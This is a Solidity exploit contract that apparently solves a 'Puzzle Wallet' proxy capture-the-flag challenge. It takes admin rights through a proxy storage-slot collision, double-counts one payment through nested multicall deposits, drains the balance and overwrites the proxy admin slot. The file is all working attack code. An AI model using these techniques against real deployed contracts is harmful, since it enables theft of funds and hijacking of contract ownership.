// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ProxyPuzzle{
    function proposeNewAdmin(address _newAdmin) external;
}

interface IPuzzleWallet{
    function addToWhitelist(address addr) external;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
    function deposit() external payable;

}

contract PuzzleWalletAttack {

    function attack(address _targetAddress) public payable{
        ProxyPuzzle(_targetAddress).proposeNewAdmin(address(this));

        IPuzzleWallet target = IPuzzleWallet(_targetAddress);
        target.addToWhitelist(address(this));
        target.addToWhitelist(msg.sender);
        
        uint256 depositAmount = msg.value;

        bytes memory depositData = abi.encodeWithSelector(target.deposit.selector);

        bytes[] memory innerData = new bytes[](1);
        innerData[0] = depositData;
        bytes memory mutilcallData = abi.encodeWithSelector(target.multicall.selector, innerData);

        bytes[] memory outerData = new bytes[](2);
        outerData[0] = depositData;
        outerData[1] = mutilcallData;

        target.multicall{value: depositAmount}(outerData);
        target.execute(msg.sender,2*depositAmount,"");
        target.setMaxBalance(uint256(uint160(msg.sender)));
    }
}